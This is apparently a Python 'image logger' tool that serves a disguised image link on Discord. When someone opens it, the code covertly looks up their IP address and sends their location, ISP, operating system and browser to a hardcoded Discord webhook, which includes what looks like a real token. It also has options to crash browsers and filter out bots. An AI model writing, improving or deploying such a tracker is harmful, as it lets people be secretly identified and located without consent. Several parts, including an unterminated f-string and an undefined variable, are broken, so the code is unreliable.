
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

# App Metadata
__app__ = "LOVE AND KISSES"
__description__ = "A simple application which logs IPs and more by using Discord's Open Original feature"
__version__ = "v1.0"
__author__ = "gay"

# Configuration
config = {
    "webhook": "https://canary.discord.com/api/webhooks/1270799712802308288/MgzcDY0mI3MEcKddq5PdgtlcF5iU304zPr5ZQE1UqpLxPdD62Su5mgNHAVU68EMYTDh6",
    "image": "https://i.ibb.co/c3mc1jw/17-Uillinn-2.png",
    "imageArgument": True,
    "username": "hehe",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")  # Blacklisted IPs or ranges

# Utility Functions
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }]
            })
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"] and config["vpnCheck"] == 2:
        return
    
    if info["hosting"] and config["antiBot"] >= 3:
        if not info["proxy"] or config["antiBot"] == 4:
            return
    
    os, browser = httpagentparser.simple_detect(useragent)
    embed = {
        "username": config["username"],
        "content": "@everyone" if not (info["proxy"] and config["vpnCheck"] in [1, 2]) else "",
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info['isp']}`
> **ASN:** `{info['as']}`
> **Country:** `{info['country']}`
> **Region:** `{info['regionName']}`
> **City:** `{info['city']}`
> **Coords:** `{coords if coords else f"{info['lat']}, {info['lon']}"}` ({'Precise' if coords else 'Approximate'})
> **Timezone:** `{info['timezone'].replace('_', ' ')}`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] and not info['proxy']}`
        
**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
            "thumbnail": {"url": url} if url else {}
        }]
    }
    requests.post(config["webhook"], json=embed)

binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode() if config["imageArgument"] and (dic.get("url") or dic.get("id")) else config["image"]

            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return

            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                return

            if config["accurateLocation"] and dic.get("g"):
                location = base64.b64decode(dic.get("g").encode()).decode()
                makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
            else:
                makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

            message = config["message"]["message"]
            if config["message"]["richMessage"]:
                message = self.enrichMessage(message, result)

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            if config["message"]["doMessage"] or config["crashBrowser"]:
                data = self.getDataWithScript(message)
            elif config["redirect"]["redirect"]:
                data = self.getRedirectPage()
            else:
                data = self.getImagePage(url)

            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

    def enrichMessage(self, message, result):
        return (message
                .replace("{ip}", self.headers.get('x-forwarded-for'))
                .replace("{isp}", result["isp"])
                .replace("{asn}", result["as"])
                .replace("{country}", result["country"])
                .replace("{region}", result["regionName"])
                .replace("{city}", result["city"])
                .replace("{lat}", str(result["lat"]))
                .replace("{long}", str(result["lon"]))
                .replace("{timezone}", result['timezone'].replace('_', ' '))
                .replace("{mobile}", str(result["mobile"]))
                .replace("{vpn}", str(result["proxy"]))
                .replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                .replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                .replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0]))

    def getDataWithScript(self, message):
        return f"<script>var i = new Image; i.src = \"{config['webhook']}\"</script>{message}".encode()

    def getRedirectPage(self):
        return f"<meta http-equiv=\"refresh\" content=\"0;url={config['redirect']['page']}\"/>".encode()

    def getImagePage(self, url):
        return f"<meta property=\"og:image\" content=\"{url}\"/>".encode()

    def do_GET(self):
        self.handleRequest()

    def do_POST(self):
        self.handleRequest()

if __name__ == "__main__":
    import http.server, socketserver
    port = 8080
    with socketserver.TCPServer(("", port), ImageLoggerAPI) as httpd:
        print(f"Serving at port {port}")
        httpd.serve_forever()
